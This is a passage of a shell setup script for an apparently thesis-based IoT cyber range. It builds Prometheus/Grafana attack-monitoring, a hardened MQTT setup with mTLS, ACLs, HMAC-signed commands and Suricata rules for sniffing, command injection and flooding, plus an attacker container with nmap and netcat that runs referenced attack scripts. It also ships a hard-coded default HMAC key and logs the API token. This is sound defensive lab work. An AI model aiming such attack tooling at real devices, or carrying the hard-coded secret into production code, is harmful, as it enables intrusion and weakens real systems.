            "# TYPE iot_messages_per_device counter"
        ]
        for dev, count in state["messages_per_device"].items():
            lines.append(f'iot_messages_per_device{{device="{dev}"}} {count}')

        # Unauthorized commands
        lines += [
            "# HELP iot_attack_commands_total Unauthorized commands injected per device",
            "# TYPE iot_attack_commands_total counter"
        ]
        for dev, count in state["attack_commands"].items():
            lines.append(f'iot_attack_commands_total{{device="{dev}"}} {count}')

        # Unlock events
        lines += [
            "# HELP iot_attack_unlock_total Unauthorized physical unlock events per device",
            "# TYPE iot_attack_unlock_total counter"
        ]
        for dev, count in state["unlock_events"].items():
            lines.append(f'iot_attack_unlock_total{{device="{dev}"}} {count}')

        # Data poisoning
        lines += [
            "# HELP iot_attack_poison_total Data poisoning events detected per device",
            "# TYPE iot_attack_poison_total counter"
        ]
        for dev, count in state["attack_poison"].items():
            lines.append(f'iot_attack_poison_total{{device="{dev}"}} {count}')

        # Total attack connections
        lines += [
            "# HELP iot_attack_connections_total Total unauthorized command attempts",
            "# TYPE iot_attack_connections_total counter"
        ]
        lines.append(f'iot_attack_connections_total {state["attack_connections"]}')

        # Timestamp of last attack
        lines += [
            "# HELP iot_last_attack_timestamp Unix timestamp of the most recent attack event",
            "# TYPE iot_last_attack_timestamp gauge"
        ]
        if state["attack_timeline"]:
            lines.append(f'iot_last_attack_timestamp {state["attack_timeline"][-1]["ts"]}')

    return "\n".join(lines) + "\n"


# ---------------------------------------------------------------------------
# HTTP Endpoints
# ---------------------------------------------------------------------------

@app.route("/metrics")
def metrics_endpoint():
    """Prometheus scrape endpoint — returns metrics in text exposition format."""
    return Response(generate_metrics(), mimetype="text/plain; version=0.0.4")


@app.route("/health")
def health():
    """Health check endpoint."""
    return {"status": "ok", "tracked_devices": len(state["sensor_values"])}


# ---------------------------------------------------------------------------
# Application Entry Point
# ---------------------------------------------------------------------------

def start_mqtt():
    """Connect to the MQTT broker and start the message processing loop."""
    client = mqtt.Client(client_id="prometheus-exporter")
    client.on_connect = on_connect
    client.on_message = on_message
    while True:
        try:
            client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
            client.loop_forever()
        except Exception as e:
            log.error(f"MQTT connection error: {e}. Retrying in 5s...")
            time.sleep(5)


if __name__ == "__main__":
    threading.Thread(target=start_mqtt, daemon=True).start()
    log.info("Prometheus exporter started on :8000")
    app.run(host="0.0.0.0", port=8000, debug=False)
EOF

# ------------------------------------------------------------------------------
# insecure/exporter/Dockerfile
# ------------------------------------------------------------------------------
cat > insecure/exporter/Dockerfile << 'EOF'
FROM python:3.11-slim
WORKDIR /app
RUN pip install --no-cache-dir flask==3.0.3 paho-mqtt==1.6.1
COPY exporter.py .
EXPOSE 8000
CMD ["python", "-u", "exporter.py"]
EOF

# ------------------------------------------------------------------------------
# insecure/prometheus/prometheus.yml
# ------------------------------------------------------------------------------
cat > insecure/prometheus/prometheus.yml << 'EOF'
# =============================================================================
# Prometheus Configuration — IoT Cyber Range
#
# Scrapes metrics from the custom exporter every 5 seconds.
# The exporter subscribes to all MQTT traffic and derives both
# operational and security-relevant metrics.
# =============================================================================

global:
  scrape_interval:     5s
  evaluation_interval: 5s

scrape_configs:
  - job_name: "iot-exporter"
    static_configs:
      - targets: ["exporter:8000"]
    metrics_path: /metrics

  - job_name: "prometheus"
    static_configs:
      - targets: ["localhost:9090"]
EOF

# ------------------------------------------------------------------------------
# insecure/grafana/provisioning/datasources/prometheus.yml
# ------------------------------------------------------------------------------
cat > insecure/grafana/provisioning/datasources/prometheus.yml << 'EOF'
# Grafana datasource — auto-provisioned on container startup
apiVersion: 1

datasources:
  - name: Prometheus
    type: prometheus
    access: proxy
    url: http://prometheus:9090
    isDefault: true
    editable: false
EOF

# ------------------------------------------------------------------------------
# insecure/grafana/provisioning/dashboards/dashboard.yml
# ------------------------------------------------------------------------------
cat > insecure/grafana/provisioning/dashboards/dashboard.yml << 'EOF'
# Grafana dashboard provider — loads JSON dashboards from this directory
apiVersion: 1

providers:
  - name: IoT Cyber Range
    type: file
    disableDeletion: false
    updateIntervalSeconds: 10
    options:
      path: /etc/grafana/provisioning/dashboards
EOF

# ------------------------------------------------------------------------------
# insecure/grafana/provisioning/dashboards/iot-dashboard.json
# Pre-built Grafana dashboard with panels for sensor data, attack events,
# and security metrics. Loaded automatically on container startup.
# ------------------------------------------------------------------------------
cat > insecure/grafana/provisioning/dashboards/iot-dashboard.json << 'EOF'
{
  "title": "IoT Cyber Range — Security Dashboard",
  "uid": "iot-cyber-range",
  "schemaVersion": 38,
  "version": 1,
  "refresh": "5s",
  "time": { "from": "now-15m", "to": "now" },
  "tags": ["iot", "security", "thesis"],
  "panels": [
    {
      "id": 1, "title": "🟢 Device Online Status",
      "type": "stat", "gridPos": { "x": 0, "y": 0, "w": 4, "h": 4 },
      "options": { "reduceOptions": { "calcs": ["lastNotNull"] }, "colorMode": "background", "graphMode": "none", "textMode": "value_and_name" },
      "fieldConfig": { "defaults": { "color": { "mode": "thresholds" }, "thresholds": { "steps": [{ "color": "red", "value": 0 }, { "color": "green", "value": 1 }] }, "mappings": [{ "type": "value", "options": { "0": { "text": "OFFLINE" }, "1": { "text": "ONLINE" } } }] } },
      "targets": [{ "expr": "iot_device_online", "legendFormat": "{{device}}", "datasource": "Prometheus" }]
    },
    {
      "id": 2, "title": "🚨 Total Injected Commands",
      "type": "stat", "gridPos": { "x": 4, "y": 0, "w": 4, "h": 4 },
      "options": { "reduceOptions": { "calcs": ["lastNotNull"] }, "colorMode": "background", "graphMode": "area" },
      "fieldConfig": { "defaults": { "color": { "mode": "thresholds" }, "thresholds": { "steps": [{ "color": "green", "value": 0 }, { "color": "orange", "value": 1 }, { "color": "red", "value": 5 }] }, "unit": "short" } },
      "targets": [{ "expr": "sum(iot_attack_commands_total)", "legendFormat": "Injected commands", "datasource": "Prometheus" }]
    },
    {
      "id": 3, "title": "🔓 Unauthorized Unlock Events",
      "type": "stat", "gridPos": { "x": 8, "y": 0, "w": 4, "h": 4 },
      "options": { "reduceOptions": { "calcs": ["lastNotNull"] }, "colorMode": "background", "graphMode": "none" },
      "fieldConfig": { "defaults": { "color": { "mode": "thresholds" }, "thresholds": { "steps": [{ "color": "green", "value": 0 }, { "color": "red", "value": 1 }] }, "unit": "short" } },
      "targets": [{ "expr": "sum(iot_attack_unlock_total)", "legendFormat": "Unlock events", "datasource": "Prometheus" }]
    },
    {
      "id": 4, "title": "☠️ Data Poisoning Events",
      "type": "stat", "gridPos": { "x": 12, "y": 0, "w": 4, "h": 4 },
      "options": { "reduceOptions": { "calcs": ["lastNotNull"] }, "colorMode": "background", "graphMode": "none" },
      "fieldConfig": { "defaults": { "color": { "mode": "thresholds" }, "thresholds": { "steps": [{ "color": "green", "value": 0 }, { "color": "red", "value": 1 }] } } },
      "targets": [{ "expr": "sum(iot_attack_poison_total)", "legendFormat": "Poisoned messages", "datasource": "Prometheus" }]
    },
    {
      "id": 5, "title": "📨 Total MQTT Messages",
      "type": "stat", "gridPos": { "x": 16, "y": 0, "w": 4, "h": 4 },
      "options": { "reduceOptions": { "calcs": ["lastNotNull"] }, "colorMode": "value", "graphMode": "area" },
      "fieldConfig": { "defaults": { "unit": "short", "color": { "mode": "palette-classic" } } },
      "targets": [{ "expr": "sum(iot_messages_total)", "legendFormat": "Total messages", "datasource": "Prometheus" }]
    },
    {
      "id": 6, "title": "🌡️ Temperature — device-001",
      "type": "timeseries", "gridPos": { "x": 0, "y": 4, "w": 8, "h": 7 },
      "options": { "tooltip": { "mode": "single" }, "legend": { "displayMode": "list", "placement": "bottom" } },
      "fieldConfig": { "defaults": { "unit": "celsius", "color": { "mode": "palette-classic" }, "custom": { "lineWidth": 2, "fillOpacity": 15 } } },
      "targets": [{ "expr": "iot_sensor_value{device=\"device-001\"}", "legendFormat": "Temperature (°C)", "datasource": "Prometheus" }]
    },
    {
      "id": 7, "title": "💧 Humidity — device-002",
      "type": "timeseries", "gridPos": { "x": 8, "y": 4, "w": 8, "h": 7 },
      "options": { "tooltip": { "mode": "single" }, "legend": { "displayMode": "list", "placement": "bottom" } },
      "fieldConfig": { "defaults": { "unit": "percent", "color": { "mode": "palette-classic" }, "custom": { "lineWidth": 2, "fillOpacity": 15 } } },
      "targets": [{ "expr": "iot_sensor_value{device=\"device-002\"}", "legendFormat": "Humidity (%)", "datasource": "Prometheus" }]
    },
    {
      "id": 8, "title": "🚪 Door Lock — device-003  (1 = locked, 0 = unlocked)",
      "type": "timeseries", "gridPos": { "x": 16, "y": 4, "w": 8, "h": 7 },
      "options": { "tooltip": { "mode": "single" }, "legend": { "displayMode": "list", "placement": "bottom" } },
      "fieldConfig": { "defaults": { "unit": "short", "min": 0, "max": 1, "color": { "mode": "thresholds" }, "thresholds": { "steps": [{ "color": "red", "value": 0 }, { "color": "green", "value": 1 }] }, "custom": { "lineWidth": 2, "fillOpacity": 30 }, "mappings": [{ "type": "value", "options": { "0": { "text": "UNLOCKED 🔓", "color": "red" }, "1": { "text": "LOCKED 🔒", "color": "green" } } }] } },
      "targets": [{ "expr": "iot_sensor_value{device=\"device-003\"}", "legendFormat": "Lock state", "datasource": "Prometheus" }]
    },
    {
      "id": 9, "title": "⚔️ Attack Timeline — Injected Commands per Device",
      "type": "timeseries", "gridPos": { "x": 0, "y": 11, "w": 12, "h": 8 },
      "options": { "tooltip": { "mode": "multi" }, "legend": { "displayMode": "list", "placement": "bottom" } },
      "fieldConfig": { "defaults": { "unit": "short", "color": { "mode": "palette-classic" }, "custom": { "lineWidth": 2, "fillOpacity": 20 } } },
      "targets": [{ "expr": "increase(iot_attack_commands_total[1m])", "legendFormat": "{{device}} — commands/min", "datasource": "Prometheus" }]
    },
    {
      "id": 10, "title": "📊 Message Rate per Device (1m window)",
      "type": "timeseries", "gridPos": { "x": 12, "y": 11, "w": 12, "h": 8 },
      "options": { "tooltip": { "mode": "multi" }, "legend": { "displayMode": "list", "placement": "bottom" } },
      "fieldConfig": { "defaults": { "unit": "short", "color": { "mode": "palette-classic" }, "custom": { "lineWidth": 2, "fillOpacity": 10 } } },
      "targets": [{ "expr": "increase(iot_messages_per_device[1m])", "legendFormat": "{{device}}", "datasource": "Prometheus" }]
    },
    {
      "id": 11, "title": "🔓 Unauthorized Unlocks by Device",
      "type": "barchart", "gridPos": { "x": 0, "y": 19, "w": 8, "h": 7 },
      "options": { "orientation": "vertical", "legend": { "displayMode": "list", "placement": "bottom" } },
      "fieldConfig": { "defaults": { "unit": "short", "color": { "mode": "thresholds" }, "thresholds": { "steps": [{ "color": "green", "value": 0 }, { "color": "red", "value": 1 }] } } },
      "targets": [{ "expr": "iot_attack_unlock_total", "legendFormat": "{{device}}", "datasource": "Prometheus", "instant": true }]
    },
    {
      "id": 12, "title": "☠️ Data Poisoning Events by Device",
      "type": "barchart", "gridPos": { "x": 8, "y": 19, "w": 8, "h": 7 },
      "options": { "orientation": "vertical", "legend": { "displayMode": "list", "placement": "bottom" } },
      "fieldConfig": { "defaults": { "unit": "short", "color": { "mode": "thresholds" }, "thresholds": { "steps": [{ "color": "green", "value": 0 }, { "color": "red", "value": 1 }] } } },
      "targets": [{ "expr": "iot_attack_poison_total", "legendFormat": "{{device}}", "datasource": "Prometheus", "instant": true }]
    },
    {
      "id": 13, "title": "📡 MQTT Traffic Distribution by Topic",
      "type": "piechart", "gridPos": { "x": 16, "y": 19, "w": 8, "h": 7 },
      "options": { "pieType": "donut", "legend": { "displayMode": "list", "placement": "right" } },
      "fieldConfig": { "defaults": { "unit": "short", "color": { "mode": "palette-classic" } } },
      "targets": [{ "expr": "iot_messages_total", "legendFormat": "{{topic}}", "datasource": "Prometheus", "instant": true }]
    }
  ]
}
EOF

# ==============================================================================
# SECURE ARCHITECTURE
# ==============================================================================
# Mirrors the insecure setup but adds:
#   - Mutual TLS (mTLS) on the MQTT broker
#   - Certificate-based client authentication
#   - MQTT ACL enforcing the principle of least privilege
#   - HMAC-signed commands with rate limiting on IoT devices
#   - Segmented Docker networks (devices cannot reach the backend directly)
#   - Suricata IDS with custom IoT attack detection rules
# ==============================================================================

# ------------------------------------------------------------------------------
# secure/broker/mosquitto.conf
# ------------------------------------------------------------------------------
cat > secure/broker/mosquitto.conf << 'EOF'
# =============================================================================
# Mosquitto Configuration — SECURE
#
# Security controls implemented:
#   1. TLS 1.3 with mutual authentication (client cert required)
#   2. Anonymous access disabled
#   3. ACL file enforcing per-device topic restrictions
#   4. Rate limiting to mitigate DoS attacks
# =============================================================================

listener 8883
protocol mqtt

# Mutual TLS: broker and clients must both present valid certificates
cafile   /mosquitto/certs/ca.crt
certfile /mosquitto/certs/broker.crt
keyfile  /mosquitto/certs/broker.key
require_certificate true
use_identity_as_username true   # CN field of client cert becomes the username
tls_version tlsv1.3

# Authentication and authorization
allow_anonymous false
password_file /mosquitto/config/passwd
acl_file      /mosquitto/config/acl

# Logging
log_type error
log_type warning
log_type notice
log_type information
log_dest stdout

# Persistence
persistence true
persistence_location /mosquitto/data/

# DoS mitigation
max_connections      50
max_inflight_messages 20
max_queued_messages  100
EOF

# ------------------------------------------------------------------------------
# secure/broker/acl
# ------------------------------------------------------------------------------
cat > secure/broker/acl << 'EOF'
# =============================================================================
# Mosquitto ACL — Principle of Least Privilege
#
# Each identity (derived from the client certificate CN) is granted only the
# minimum topic permissions required for its role.
#
# Pattern substitution: %u expands to the authenticated username (cert CN).
# This ensures each device can only publish to its own topics.
# =============================================================================

# Backend: read-only access to all device data
user backend
topic read iot/#
topic read $SYS/#

# IDS monitor: passive read-only access to all traffic
user ids-monitor
topic read #

# IoT devices: each device can only write its own data/status topics
# and read its own command topic — lateral movement via MQTT is impossible
pattern write iot/%u/data
pattern write iot/%u/status
pattern read  iot/%u/cmd
EOF

# ------------------------------------------------------------------------------
# secure/broker/Dockerfile
# ------------------------------------------------------------------------------
cat > secure/broker/Dockerfile << 'EOF'
FROM eclipse-mosquitto:2.0
RUN mkdir -p /mosquitto/data /mosquitto/log /mosquitto/certs
COPY mosquitto.conf /mosquitto/config/mosquitto.conf
COPY acl /mosquitto/config/acl
EXPOSE 8883
EOF

# ------------------------------------------------------------------------------
# secure/iot-device/device.py
# Hardened device with mTLS, HMAC command validation, and rate limiting.
# ------------------------------------------------------------------------------
cat > secure/iot-device/device.py << 'EOF'
#!/usr/bin/env python3
"""
IoT Device Simulator — Secure Architecture

Implements a hardened version of the IoT device with the following controls:

    Security controls:
        - Mutual TLS (mTLS): device presents a certificate signed by the CA
        - HMAC-SHA256 command authentication: rejects unsigned commands
        - Rate limiting: max 5 commands per 60-second window
        - Input validation: rejects non-JSON payloads
        - Bounded interval: prevents DoS via set_interval command

    Contrast with insecure device:
        - All of the above are absent in the insecure version
        - The same attack scripts will fail silently or be rejected
"""

import os
import json
import time
import hmac
import hashlib
import random
import logging
import ssl
import paho.mqtt.client as mqtt

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
log = logging.getLogger("secure-device")

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
DEVICE_ID        = os.getenv("DEVICE_ID", "device-000")
BROKER_HOST      = os.getenv("BROKER_HOST", "localhost")
BROKER_PORT      = int(os.getenv("BROKER_PORT", 8883))
PUBLISH_INTERVAL = int(os.getenv("PUBLISH_INTERVAL", 5))
SENSOR_TYPE      = os.getenv("SENSOR_TYPE", "temperature")
CA_CERT          = os.getenv("CA_CERT", "/certs/ca.crt")
CLIENT_CERT      = os.getenv("CLIENT_CERT", f"/certs/{DEVICE_ID}.crt")
CLIENT_KEY       = os.getenv("CLIENT_KEY", f"/certs/{DEVICE_ID}.key")

# Shared HMAC key for command authentication.
# In production this should be loaded from a hardware security module or vault.
CMD_HMAC_KEY = os.getenv("CMD_HMAC_KEY", "thesis-secret-key-2024").encode()

TOPIC_DATA   = f"iot/{DEVICE_ID}/data"
TOPIC_CMD    = f"iot/{DEVICE_ID}/cmd"
TOPIC_STATUS = f"iot/{DEVICE_ID}/status"

# Rate limiter state
_CMD_RATE_LIMIT  = 5    # max commands allowed per window
_CMD_RATE_WINDOW = 60   # window duration in seconds
_cmd_timestamps: list[float] = []


def generate_reading() -> dict:
    """Generate a simulated sensor reading based on sensor type."""
    if SENSOR_TYPE == "temperature":
        return {"value": round(random.uniform(18.0, 35.0), 2), "unit": "C"}
    elif SENSOR_TYPE == "humidity":
        return {"value": round(random.uniform(30.0, 90.0), 2), "unit": "%"}
    elif SENSOR_TYPE == "door_lock":
        return {"value": random.choice(["locked", "unlocked"]), "unit": "state"}
    return {"value": round(random.uniform(0, 100), 2), "unit": "raw"}


def verify_hmac(payload: dict) -> bool:
    """
    Verify the HMAC-SHA256 signature of an incoming command payload.

    The sender must include a 'sig' field containing the hex digest of
    HMAC-SHA256(key, canonical_json(payload_without_sig)).
    Commands without a valid signature are rejected.
    """
    sig = payload.pop("sig", None)
    if not sig:
        log.warning("Command missing HMAC signature — REJECTED")
        return False

    canonical = json.dumps(payload, sort_keys=True).encode()
    expected  = hmac.new(CMD_HMAC_KEY, canonical, hashlib.sha256).hexdigest()

    if not hmac.compare_digest(sig, expected):
        log.warning("Invalid HMAC signature — REJECTED (possible injection attack)")
        return False

    return True


def is_rate_limited() -> bool:
    """
    Enforce a sliding-window rate limit on incoming commands.
    Returns True if the rate limit has been exceeded.
    """
    now = time.time()
    # Remove timestamps outside the current window
    _cmd_timestamps[:] = [t for t in _cmd_timestamps if now - t < _CMD_RATE_WINDOW]

    if len(_cmd_timestamps) >= _CMD_RATE_LIMIT:
        log.warning(
            f"Rate limit exceeded ({_CMD_RATE_LIMIT} commands/{_CMD_RATE_WINDOW}s) — REJECTED"
        )
        return True

    _cmd_timestamps.append(now)
    return False


def on_connect(client, userdata, flags, rc):
    """Subscribe to command topic and publish online status after connection."""
    if rc == 0:
        log.info(f"Connected via mTLS to broker at {BROKER_HOST}:{BROKER_PORT}")
        client.subscribe(TOPIC_CMD)
        client.publish(
            TOPIC_STATUS,
            json.dumps({"status": "online", "device": DEVICE_ID}),
            retain=True
        )
    else:
        log.error(f"Connection failed, rc={rc}")


def on_message(client, userdata, msg):
    """
    Process an incoming command.
    The command is only executed if it passes rate limiting and HMAC verification.
    """
    # Guard 1: rate limit check
    if is_rate_limited():
        return

    # Guard 2: JSON parsing
    try:
        payload = json.loads(msg.payload.decode())
    except Exception:
        log.warning("Non-JSON payload received — REJECTED")
        return

    # Guard 3: HMAC signature verification
    if not verify_hmac(payload):
        return

    cmd = payload.get("cmd", "")
    log.info(f"[AUTHORIZED CMD] Executing: {cmd}")

    if cmd == "reboot":
        log.info("Authorized reboot initiated")
    elif cmd == "set_interval":
        global PUBLISH_INTERVAL
        # Bound the interval to a safe range to prevent DoS
        PUBLISH_INTERVAL = max(1, min(int(payload.get("value", PUBLISH_INTERVAL)), 3600))
        log.info(f"Publish interval updated to {PUBLISH_INTERVAL}s")
    elif cmd == "unlock":
        log.info("Authorized and authenticated unlock executed")


def main():
    client = mqtt.Client(client_id=DEVICE_ID)
    client.on_connect = on_connect
    client.on_message = on_message

    # Configure mutual TLS — both parties authenticate with certificates
    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=CA_CERT)
    ctx.load_cert_chain(certfile=CLIENT_CERT, keyfile=CLIENT_KEY)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_3
    client.tls_set_context(ctx)
    log.info("Mutual TLS configured (TLS 1.3)")

    client.will_set(
        TOPIC_STATUS,
        json.dumps({"status": "offline", "device": DEVICE_ID}),
        retain=True
    )

    while True:
        try:
            client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
            break
        except Exception as e:
            log.error(f"Connection failed: {e}. Retrying in 5s...")
            time.sleep(5)

    client.loop_start()
    log.info(f"Secure device {DEVICE_ID} ({SENSOR_TYPE}) started")

    while True:
        reading = generate_reading()
        payload = {
            "device_id": DEVICE_ID,
            "sensor":    SENSOR_TYPE,
            "timestamp": time.time(),
            **reading
        }
        client.publish(TOPIC_DATA, json.dumps(payload))
        log.info(f"Published (TLS encrypted): {payload}")
        time.sleep(PUBLISH_INTERVAL)


if __name__ == "__main__":
    main()
EOF

# ------------------------------------------------------------------------------
# secure/iot-device/Dockerfile
# ------------------------------------------------------------------------------
cat > secure/iot-device/Dockerfile << 'EOF'
FROM python:3.11-slim
WORKDIR /app
RUN pip install --no-cache-dir paho-mqtt==1.6.1
COPY device.py .
CMD ["python", "-u", "device.py"]
EOF

# ------------------------------------------------------------------------------
# secure/backend/backend.py
# ------------------------------------------------------------------------------
cat > secure/backend/backend.py << 'EOF'
#!/usr/bin/env python3
"""
IoT Backend — Secure Architecture

Connects to the MQTT broker via mutual TLS and exposes sensor data
through a REST API protected by Bearer token authentication.

Security controls compared to the insecure version:
    - mTLS connection to broker (encrypted, authenticated)
    - API token required on all data endpoints
    - Token generated with cryptographic randomness at startup
"""

import os
import json
import time
import threading
import logging
import ssl
import secrets
from collections import defaultdict, deque
from flask import Flask, jsonify, request, abort
import paho.mqtt.client as mqtt

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
log = logging.getLogger("secure-backend")

BROKER_HOST = os.getenv("BROKER_HOST", "localhost")
BROKER_PORT = int(os.getenv("BROKER_PORT", 8883))
CA_CERT     = os.getenv("CA_CERT",     "/certs/ca.crt")
CLIENT_CERT = os.getenv("CLIENT_CERT", "/certs/backend.crt")
CLIENT_KEY  = os.getenv("CLIENT_KEY",  "/certs/backend.key")

# Generate a cryptographically secure API token at startup
# In production: load from a secrets manager (Vault, AWS Secrets Manager, etc.)
API_TOKEN = os.getenv("API_TOKEN", secrets.token_hex(32))
log.info(f"API Token (share with authorized clients): {API_TOKEN}")

app = Flask(__name__)
device_data:   dict[str, deque] = defaultdict(lambda: deque(maxlen=100))
device_status: dict[str, dict]  = {}


def require_auth(f):
    """Decorator that enforces Bearer token authentication on API endpoints."""
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.headers.get("Authorization", "")
        if not auth.startswith("Bearer ") or auth[7:] != API_TOKEN:
            abort(401)
        return f(*args, **kwargs)
    return decorated


def on_connect(client, userdata, flags, rc):
    log.info(f"Backend connected via mTLS (rc={rc})")
    client.subscribe("iot/#")


def on_message(client, userdata, msg):
    try:
        payload = json.loads(msg.payload.decode())
        parts   = msg.topic.split("/")
        if len(parts) >= 3:
            dev, typ = parts[1], parts[2]
            if   typ == "data":   device_data[dev].append(payload)
            elif typ == "status": device_status[dev] = payload
    except Exception as e:
        log.error(f"Parsing error: {e}")


@app.route("/api/devices")
@require_auth
def get_devices():
    return jsonify({"devices": list(device_data.keys()), "status": device_status})


@app.route("/api/devices/<device_id>/data")
@require_auth
def get_device_data(device_id: str):
    return jsonify({
        "device_id": device_id,
        "readings":  list(device_data.get(device_id, []))
    })


@app.route("/health")
def health():
    return jsonify({"status": "ok"})


def start_mqtt():
    client = mqtt.Client(client_id="secure-backend")
    client.on_connect = on_connect
    client.on_message = on_message
    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=CA_CERT)
    ctx.load_cert_chain(certfile=CLIENT_CERT, keyfile=CLIENT_KEY)
    client.tls_set_context(ctx)
    client.connect(BROKER_HOST, BROKER_PORT)
    client.loop_forever()


if __name__ == "__main__":
    threading.Thread(target=start_mqtt, daemon=True).start()
    app.run(host="0.0.0.0", port=5000, debug=False)
EOF

# ------------------------------------------------------------------------------
# secure/backend/Dockerfile
# ------------------------------------------------------------------------------
cat > secure/backend/Dockerfile << 'EOF'
FROM python:3.11-slim
WORKDIR /app
RUN pip install --no-cache-dir flask==3.0.3 paho-mqtt==1.6.1
COPY backend.py .
EXPOSE 5000
CMD ["python", "-u", "backend.py"]
EOF

# ------------------------------------------------------------------------------
# secure/attacker/Dockerfile
# Same tooling as the insecure attacker — attacks will fail against this env.
# ------------------------------------------------------------------------------
cat > secure/attacker/Dockerfile << 'EOF'
FROM python:3.11-slim
RUN apt-get update && apt-get install -y --no-install-recommends \
    mosquitto-clients tcpdump nmap netcat-openbsd curl \
    && rm -rf /var/lib/apt/lists/*
RUN pip install --no-cache-dir paho-mqtt==1.6.1 requests
WORKDIR /attacks
COPY attack_01_sniff.py .
COPY attack_02_cmd_inject.py .
CMD ["tail", "-f", "/dev/null"]
EOF

# Copy the same attack scripts — they will fail on the secure architecture
cp insecure/attacker/attack_01_sniff.py  secure/attacker/
cp insecure/attacker/attack_02_cmd_inject.py secure/attacker/

# ------------------------------------------------------------------------------
# secure/ids/rules/iot-attacks.rules
# Suricata rules for detecting common IoT/MQTT attack patterns.
# ------------------------------------------------------------------------------
cat > secure/ids/rules/iot-attacks.rules << 'EOF'
# =============================================================================
# Suricata Rules — IoT MQTT Attack Detection
#
# Each rule targets a specific attack pattern demonstrated in the thesis.
# SIDs 9000001–9000007 are reserved for this research project.
# =============================================================================

# Rule 1: Plaintext MQTT connection attempt (should be TLS-only in secure arch)
alert tcp any any -> any 1883 (
    msg:"IOT MQTT Plaintext Connection Attempt";
    flow:to_server,established;
    content:"|10|"; offset:0; depth:1;
    classtype:policy-violation;
    sid:9000001; rev:1;
)

# Rule 2: Wildcard subscription '#' — characteristic of a traffic sniffer
alert tcp any any -> any 1883 (
    msg:"IOT MQTT Wildcard Subscription - Possible Sniffer";
    flow:to_server,established;
    content:"|82|";
    content:"|00 01 23|";
    classtype:attempted-recon;
    sid:9000002; rev:1;
)

# Rule 3: PUBLISH to a command topic — possible unauthorized command injection
alert tcp any any -> any 1883 (
    msg:"IOT MQTT Unauthorized Command Publish";
    flow:to_server,established;
    content:"|30|";
    content:"cmd";
    classtype:attempted-user;
    sid:9000003; rev:1;
)

# Rule 4: High-frequency PUBLISH — possible denial of service flood
alert tcp any any -> any 1883 (
    msg:"IOT MQTT Publish Flood - Possible DoS";
    flow:to_server,established;
    content:"|30|";
    threshold:type both, track by_src, count 50, seconds 10;
    classtype:attempted-dos;
    sid:9000004; rev:1;
)

# Rule 5: Port scan targeting the MQTT broker
alert tcp any any -> any 1883 (
    msg:"IOT Port Scan Targeting MQTT Broker";
    flags:S;
    threshold:type both, track by_src, count 5, seconds 5;
    classtype:attempted-recon;
    sid:9000005; rev:1;
)

# Rule 6: Anomalous sensor value in payload — characteristic of data poisoning
alert tcp any any -> any 1883 (
    msg:"IOT MQTT Anomalous Sensor Value - Possible Data Poisoning";
    flow:to_server,established;
    content:"|30|";
    content:"-99";
    classtype:bad-unknown;
    sid:9000006; rev:1;
)
EOF

# ------------------------------------------------------------------------------
# secure/ids/Dockerfile
# ------------------------------------------------------------------------------
cat > secure/ids/Dockerfile << 'EOF'
FROM jasonish/suricata:latest
COPY rules/ /etc/suricata/rules/custom/
RUN mkdir -p /var/log/suricata
CMD ["suricata", "-c", "/etc/suricata/suricata.yaml", "-i", "eth0", "--init-errors-fatal"]
EOF

# ------------------------------------------------------------------------------
# secure/docker-compose.yml
# Segmented network topology with three isolated subnets.
# ------------------------------------------------------------------------------
cat > secure/docker-compose.yml << 'EOF'
# =============================================================================
# Secure IoT Architecture — Docker Compose
#
# Network segmentation (three isolated subnets):
#   iot_device_net  (10.20.1.0/24) — IoT devices and broker only
#   iot_backend_net (10.20.2.0/24) — broker and backend only
#   iot_monitor_net (10.20.3.0/24) — IDS passive monitoring
#
# The attacker container is placed only on iot_device_net and therefore
# cannot directly reach the backend — demonstrating effective segmentation.
# =============================================================================
networks:
  iot_device_net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.20.1.0/24

  iot_backend_net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.20.2.0/24

  iot_monitor_net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.20.3.0/24

services:

  # ---------------------------------------------------------------------------
  # Secure MQTT Broker — mTLS, ACL, no anonymous access
  # Sits on all three networks as the central communication hub.
  # ---------------------------------------------------------------------------
  broker:
    build: ./broker
    container_name: secure_broker
    ports:
      - "8883:8883"
    networks:
      iot_device_net:
        ipv4_address: 10.20.1.10
      iot_backend_net:
        ipv4_address: 10.20.2.10
      iot_monitor_net:
        ipv4_address: 10.20.3.10
    volumes:
      - ./broker/certs:/mosquitto/certs:ro
      - ./broker/acl:/mosquitto/config/acl:ro

  # ---------------------------------------------------------------------------
  # Secure Backend — mTLS to broker, Bearer token on REST API
  # Isolated on the backend network — unreachable from the device network.
  # ---------------------------------------------------------------------------
  backend:
    build: ./backend
    container_name: secure_backend
    environment:
      BROKER_HOST: 10.20.2.10
      BROKER_PORT: 8883
      CA_CERT:     /certs/ca.crt
      CLIENT_CERT: /certs/backend.crt
      CLIENT_KEY:  /certs/backend.key
    ports:
      - "5001:5000"
    networks:
      iot_backend_net:
        ipv4_address: 10.20.2.20
    depends_on:
      - broker
    volumes:
      - ./broker/certs:/certs:ro

  # ---------------------------------------------------------------------------
  # Secure IoT Devices — mTLS, HMAC command auth, rate limiting
  # ---------------------------------------------------------------------------
  iot-device-1:
    build: ./iot-device
    container_name: secure_device_1
    environment:
      DEVICE_ID:        device-001
      BROKER_HOST:      10.20.1.10
      BROKER_PORT:      8883
      CA_CERT:          /certs/ca.crt
      CLIENT_CERT:      /certs/device-001.crt
      CLIENT_KEY:       /certs/device-001.key
      PUBLISH_INTERVAL: 5
      SENSOR_TYPE:      temperature
    networks:
      iot_device_net:
        ipv4_address: 10.20.1.101
    volumes:
      - ./broker/certs:/certs:ro
    depends_on:
      - broker

  iot-device-2:
    build: ./iot-device
    container_name: secure_device_2
    environment:
      DEVICE_ID:        device-002
      BROKER_HOST:      10.20.1.10
      BROKER_PORT:      8883
      CA_CERT:          /certs/ca.crt
      CLIENT_CERT:      /certs/device-002.crt
      CLIENT_KEY:       /certs/device-002.key
      PUBLISH_INTERVAL: 7
